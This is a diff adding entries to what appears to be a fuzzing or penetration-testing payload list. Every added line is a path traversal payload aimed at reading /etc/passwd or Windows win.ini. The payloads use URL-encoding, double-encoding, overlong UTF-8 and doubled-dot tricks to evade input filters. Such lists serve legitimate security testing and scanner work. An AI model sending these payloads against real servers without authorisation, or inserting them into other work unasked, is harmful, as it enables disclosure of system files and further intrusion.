@@ -643,6 +643,16 @@ File:///
 
 ../../../../../../../../../../../etc/passwd%00
 ../../../../../../../../../../../etc/hosts
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+....//....//....//....//....//etc/passwd
+..\..\..\..\..\..\..\..\windows\win.ini
+..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
+/etc/passwd
+file:///etc/passwd
+C:\Windows\win.ini
 
 #	Known CVEs and Vulnerabilities
 #
